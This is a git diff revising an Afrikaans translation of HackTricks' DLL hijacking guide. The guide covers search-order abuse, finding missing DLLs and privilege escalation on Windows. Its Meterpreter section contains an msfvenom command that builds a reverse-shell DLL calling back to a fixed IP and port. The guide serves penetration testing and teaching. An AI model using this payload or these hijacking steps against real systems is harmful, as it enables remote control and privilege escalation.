@@ -6,9 +6,9 @@
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy wil sien jou **maatskappy geadverteer in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
@@ -16,39 +16,39 @@ Ander maniere om HackTricks te ondersteun:
 
 <figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Beloningsjag wenk**: **teken aan** vir **Intigriti**, 'n premium **beloningsjag platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin verdien belonings tot **$100,000**!
+**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin verdien belonings tot **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
 ## Basiese Inligting
 
-DLL Ontvoering behels die manipulering van 'n vertroude toepassing om 'n skadelike DLL te laai. Hierdie term sluit verskeie taktieke in soos **DLL Vervalsing, Inspruiting, en Kantlaai**. Dit word hoofsaaklik gebruik vir kode-uitvoering, bereiking van volharding, en, minder algemeen, voorreg-escalasie. Ten spyte van die fokus op escalasie hier, bly die metode van ontvoering konsekwent oor doelwitte.
+DLL Ontvoering behels die manipulering van 'n vertroude toepassing om 'n skadelike DLL te laai. Hierdie term sluit verskeie taktieke in soos **DLL Spoofing, Injeksie, en Kantlaai**. Dit word hoofsaaklik gebruik vir kode-uitvoering, bereiking van volharding, en, minder algemeen, voorreg-escalasie. Ten spyte van die fokus op escalasie hier, bly die metode van ontvoering konsekwent oor doelwitte.
 
 ### Algemene Tegnieke
 
-Verskeie metodes word gebruik vir DLL-ontvoering, elk met sy doeltreffendheid afhanklik van die toepassing se DLL-laai-strategie:
+Verskeie metodes word gebruik vir DLL-ontvoering, elk met sy doeltreffendheid afhangende van die toepassing se DLL-laai-strategie:
 
 1. **DLL Vervanging**: Omruiling van 'n ware DLL met 'n skadelike een, opsioneel met gebruik van DLL Proksy om die oorspronklike DLL se funksionaliteit te behou.
 2. **DLL Soekorde Ontvoering**: Plaas die skadelike DLL in 'n soekpad voor die regmatige een, wat die toepassing se soekpatroon benut.
-3. **Spook DLL Ontvoering**: Skep 'n skadelike DLL vir 'n toepassing om te laai, dinkend dit is 'n nie-bestaande vereiste DLL.
+3. **Spook DLL Ontvoering**: Skep 'n skadelike DLL vir 'n toepassing om te laai, dinkende dit is 'n nie-bestaande vereiste DLL.
 4. **DLL Aanstuur**: Wysig soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local` lêers om die toepassing na die skadelike DLL te rig.
 5. **WinSxS DLL Vervanging**: Vervanging van die regmatige DLL met 'n skadelike eweknie in die WinSxS-gids, 'n metode dikwels geassosieer met DLL kantlaai.
 6. **Relatiewe Pad DLL Ontvoering**: Plaas die skadelike DLL in 'n gebruikerbeheerde gids saam met die gekopieerde toepassing, wat lyk na Binêre Proksie Uitvoeringstegnieke.
 
 ## Vind van ontbrekende Dlls
 
-Die mees algemene manier om ontbrekende Dlls binne 'n stelsel te vind is deur [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te hardloop, **stel** die **volgende 2 filters** in:
+Die mees algemene manier om ontbrekende Dlls binne 'n stelsel te vind is deur [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) vanaf sysinternals te hardloop, **stel** die **volgende 2 filters in**:
 
-![](<../../../.gitbook/assets/image (958).png>)
+![](<../../../.gitbook/assets/image (961).png>)
 
-![](<../../../.gitbook/assets/image (227).png>)
+![](<../../../.gitbook/assets/image (230).png>)
 
 en wys net die **Lêersisteemaktiwiteit**:
 
-![](<../../../.gitbook/assets/image (150).png>)
+![](<../../../.gitbook/assets/image (153).png>)
 
-As jy soek na **ontbrekende dlls in die algemeen** laat jy dit vir 'n paar **sekondes** loop.\
-As jy soek na 'n **ontbrekende dll binne 'n spesifieke uitvoerbare lêer** moet jy 'n **ander filter instel soos "Prosesnaam" "bevat" "\<uitvoernaam>", voer dit uit, en stop die vaslegging van gebeure**.
+As jy op soek is na **ontbrekende dlls in die algemeen** laat jy dit vir 'n paar **sekondes** loop.\
+As jy op soek is na 'n **ontbrekende dll binne 'n spesifieke uitvoerbare lêer** moet jy 'n **ander filter instel soos "Prosesnaam" "bevat" "\<uitvoernaam>", voer dit uit, en stop die vaslegging van gebeure**.
 
 ## Uitbuiting van Ontbrekende Dlls
 
@@ -56,19 +56,19 @@ Om voorregte te eskaleer, is die beste kans wat ons het om in staat te wees om '
 
 ### Dll Soekorde
 
-**Binne die** [**Microsoft-dokumentasie**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kan jy vind hoe die Dlls spesifiek gelaai word.**
+Binne die [**Microsoft-dokumentasie**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kan jy vind hoe die Dlls spesifiek gelaai word**.
 
-**Windows-toepassings** soek na DLLs deur 'n reeks **voorafbepaalde soekpaaie** te volg, in ooreenstemming met 'n spesifieke volgorde. Die probleem van DLL-ontvoering ontstaan wanneer 'n skadelike DLL strategies in een van hierdie gids geplaas word, verseker dat dit gelaai word voordat die egte DLL. 'n Oplossing om dit te voorkom is om te verseker dat die toepassing absolute paaie gebruik wanneer dit na die DLLs verwys wat dit benodig.
+**Windows-toepassings** soek na DLLs deur 'n reeks **voorafbepaalde soekpaaie** te volg, in ooreenstemming met 'n spesifieke volgorde. Die probleem van DLL-ontvoering ontstaan wanneer 'n skadelike DLL strategies in een van hierdie gidses geplaas word, verseker dat dit gelaai word voordat die egte DLL. 'n Oplossing om dit te voorkom is om te verseker dat die toepassing absolute paaie gebruik wanneer dit na die DLLs verwys wat dit benodig.
 
-Jy kan die **DLL soekorde op 32-biet** stelsels hieronder sien:
+Jy kan die **DLL soekorde op 32-bietjie** stelsels hieronder sien:
 
-1. Die gids waaruit die toepassing gelaai het.
+1. Die gids waaruit die toepassing gelaai is.
 2. Die stelselgids. Gebruik die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) funksie om die pad van hierdie gids te kry.(_C:\Windows\System32_)
-3. Die 16-biet stelselgids. Daar is geen funksie wat die pad van hierdie gids kry nie, maar dit word gesoek. (_C:\Windows\System_)
+3. Die 16-bietjie stelselgids. Daar is geen funksie wat die pad van hierdie gids kry nie, maar dit word gesoek. (_C:\Windows\System_)
 4. Die Windows-gids. Gebruik die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) funksie om die pad van hierdie gids te kry.
 1. (_C:\Windows_)
 5. Die huidige gids.
-6. Die gidse wat in die PATH-omgewingsveranderlike gelys is. Let daarop dat dit nie die per-toepassing-gids insluit wat deur die **App Paths**-register sleutel gespesifiseer is nie. Die **App Paths** sleutel word nie gebruik wanneer die DLL-soekpad bereken word nie.
+6. Die gidsies wat in die PATH-omgewingsveranderlike gelys is. Let daarop dat dit nie die per-toepassing-gids insluit wat deur die **App Paths**-register sleutel gespesifiseer is nie. Die **App Paths** sleutel word nie gebruik wanneer die DLL soekpad bereken word nie.
 
 Dit is die **verstek** soekorde met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer is, eskaleer die huidige gids na die tweede plek. Om hierdie funksie te deaktiveer, skep die **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registerwaarde en stel dit in op 0 (verstek is geaktiveer).
 
@@ -79,23 +79,23 @@ Laastens, let daarop dat **'n dll gelaai kan word deur die absolute pad aan te d
 Daar is ander maniere om die soekorde te verander maar ek gaan dit nie hier verduidelik nie.
 #### Uitsluitings op dll-soekvolgorde vanaf Windows-dokumentasie
 
-Sekere uitsonderings op die standaard DLL-soekvolgorde word genoteer in Windows-dokumentasie:
+Sekere uitsonderings op die standaard DLL-soekvolgorde word genoteer in die Windows-dokumentasie:
 
-- Wanneer 'n **DLL wat sy naam deel met een wat reeds in die geheue gelaai is** teenkom word, omseil die stelsel die gewone soektog. In plaas daarvan, voer dit 'n kontrole vir omleiding en 'n manifest uit voordat dit by die reeds in die geheue gelaai DLL uitkom. **In hierdie scenario, doen die stelsel nie 'n soektog vir die DLL nie**.
-- In gevalle waar die DLL erken word as 'n **bekende DLL** vir die huidige Windows-weergawe, sal die stelsel sy weergawe van die bekende DLL gebruik, saam met enige van sy afhanklike DLL's, **om die soekproses te vermy**. Die register sleutel **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** hou 'n lys van hierdie bekende DLL's.
-- Indien 'n **DLL afhanklikhede het**, word die soektog na hierdie afhanklike DLL's uitgevoer asof hulle slegs deur hul **module name** aangedui is, ongeag of die aanvanklike DLL deur 'n volledige pad geïdentifiseer is.
+* Wanneer 'n **DLL wat sy naam deel met een wat reeds in die geheue gelaai is** teenkom word, ignoreer die stelsel die gewone soektog. In plaas daarvan, voer dit 'n kontrole vir omleiding en 'n manifest uit voordat dit by die reeds in die geheue gelaai DLL uitkom. **In hierdie scenario doen die stelsel nie 'n soektog vir die DLL nie**.
+* In gevalle waar die DLL erken word as 'n **bekende DLL** vir die huidige Windows-weergawe, sal die stelsel sy weergawe van die bekende DLL gebruik, saam met enige van sy afhanklike DLL's, **sonder om die soekproses te volg**. Die register sleutel **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** hou 'n lys van hierdie bekende DLL's.
+* Indien 'n **DLL afhanklikhede het**, word die soektog na hierdie afhanklike DLL's uitgevoer asof hulle slegs aangedui is deur hul **module name**, ongeag of die aanvanklike DLL geïdentifiseer is deur 'n volledige pad.
 
 ### Voorregte Eskalasie
 
 **Vereistes**:
 
-- Identifiseer 'n proses wat onder **verskillende voorregte** (horisontale of laterale beweging) werk of sal werk, wat 'n **DLL kortkom**.
-- Verseker dat **skryftoegang** beskikbaar is vir enige **gids** waarin die **DLL** sal word **gesoek**. Hierdie plek kan die gids van die uitvoerbare lêer wees of 'n gids binne die stelselpad.
+* Identifiseer 'n proses wat bedryf of sal bedryf word onder **verskillende voorregte** (horisontale of laterale beweging), wat 'n **DLL kortkom**.
+* Verseker dat **skryftoegang** beskikbaar is vir enige **gids** waarin die **DLL** sal word **gesoek**. Hierdie plek kan die gids van die uitvoerbare lêer wees of 'n gids binne die stelselpad.
 
-Ja, die vereistes is moeilik om te vind aangesien **dit by verstek nogal vreemd is om 'n bevoorregte uitvoerbare lêer sonder 'n dll te vind** en dit is selfs **meer vreemd om skryftoestemmings op 'n stelselpadgids te hê** (jy kan dit nie by verstek hê nie). Maar, in verkeerd geconfigureerde omgewings is dit moontlik.\
-In die geval dat jy gelukkig is en jy vind dat jy aan die vereistes voldoen, kan jy die [UACME](https://github.com/hfiref0x/UACME) projek nagaan. Selfs al is die **hoofdoel van die projek om UAC te omseil**, kan jy daar 'n **PoC** van 'n Dll-hacking vir die Windows-weergawe vind wat jy kan gebruik (waarskynlik net deur die pad van die gids waar jy skryftoestemmings het te verander).
+Ja, die vereistes is moeilik om te vind aangesien **dit by verstek nogal vreemd is om 'n bevoorregte uitvoerbare lêer sonder 'n dll te vind** en dit is selfs **nog vreemder om skryftoestemmings op 'n stelselpadgids te hê** (jy kan dit nie by verstek hê nie). Maar, in verkeerd geconfigureerde omgewings is dit moontlik.\
+In die geval dat jy gelukkig is en jy vind dat jy aan die vereistes voldoen, kan jy die [UACME](https://github.com/hfiref0x/UACME) projek nagaan. Selfs al is die **hoofdoel van die projek om UAC te omseil**, kan jy daar 'n **PoC** van 'n Dll-hacking vir die Windows-weergawe vind wat jy kan gebruik (waarskynlik net deur die pad van die gids waar jy skryftoestemmings het, te verander).
 
-Merk op dat jy jou toestemmings in 'n gids kan **nagaan deur** te doen:
+Merk op dat jy jou **toestemmings in 'n gids kan nagaan** deur:
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
@@ -109,7 +109,7 @@ Jy kan ook die invoere van 'n uitvoerbare lêer en die uitvoere van 'n dll nagaa
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-Vir 'n volledige gids oor hoe om **Dll Hijacking te misbruik om voorregte te eskaleer** met toestemmings om in 'n **Sisteempad-vouer te skryf** kyk:
+Vir 'n volledige gids oor hoe om **Dll Hijacking te misbruik om voorregte te eskaleer** met toestemmings om in 'n **Sisteempad-vouer** te skryf, kyk:
 
 {% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
 [writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
@@ -117,7 +117,7 @@ Vir 'n volledige gids oor hoe om **Dll Hijacking te misbruik om voorregte te esk
 
 ### Geoutomatiseerde gereedskap
 
-[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sal nagaan of jy skryfregte het op enige vouer binne die sisteem PAD.\
+[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sal nagaan of jy skryftoestemmings het op enige vouer binne die stelsel-PAD.\
 Ander interessante geoutomatiseerde gereedskap om hierdie kwesbaarheid te ontdek is **PowerSploit-funksies**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._
 
 ### Voorbeeld
@@ -135,7 +135,7 @@ Met die gereedskap [**DLLirant**](https://github.com/redteamsocietegenerale/DLLi
 
 ### **Meterpreter**
 
-**Kry rev shell (x64):**
+**Kry rev-skyf (x64):**
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
@@ -237,7 +237,7 @@ return TRUE;
 
 <figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bugsbounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bugsbounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin om belonings te verdien tot **$100,000**!
+**Foutbounty wenk**: **teken aan** vir **Intigriti**, 'n premium **foutbounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin om belonings te verdien tot **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
@@ -251,6 +251,6 @@ Ander maniere om HackTricks te ondersteun:
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
